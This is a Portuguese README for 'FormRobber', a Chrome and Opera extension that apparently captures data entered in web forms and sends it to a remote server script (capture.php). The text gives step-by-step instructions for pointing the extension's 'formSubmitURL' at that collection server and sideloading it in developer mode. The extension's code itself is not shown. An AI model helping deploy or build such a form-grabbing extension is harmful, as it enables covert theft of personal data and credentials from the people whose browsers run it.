# FormRobber (Extensão de navegador)
Aqui está organizado o código (JavaScript) da extensão de navegador.
Esta extensão funciona com o Google Chrome e Opera.

## Como instalar a extensão no navegador de internet
* Altere o arquivo [main.js](main.js) de forma que a variável "formSubmitURL" tenha o endereço do servidor em questão, que receberá os dados capturados (deve ser o endereço completo para a página [capture.php](../Servidor/capture.php)).
* Comprima todos os arquivos desta pasta ([jquery.min.js](jquery.min.js), [main.js](main.js) e [manifest.json](manifest.json)) em um único arquivo *.ZIP.
* Inicie o navegador de internet em que a extensão será instalada.
* Abra a página das extensões do navegador. No Google Chrome esta página é _chrome://extensions/_ e no Opera é _opera://extensions/_.
* Ative o Modo de Desenvolvedor. Essa opção costuma ficar na parte de cima, na barra de ferramentas.
* No explorador de arquivos do seu sistema, localize o *.ZIP com os arquivos da extensão, clique e arraste-o até a página de extensões do navegador (com o Modo de Desenvolvedor ativado).
* Se todos os passos foram seguidos corretamente, a extensão será instalada. Se ela não for automaticamente ativada, faça-o.
* Pronto, a extensão já está funcionando. Talvez seja necessário atualizar as abas abertas para que ela entre em vigor nestas.
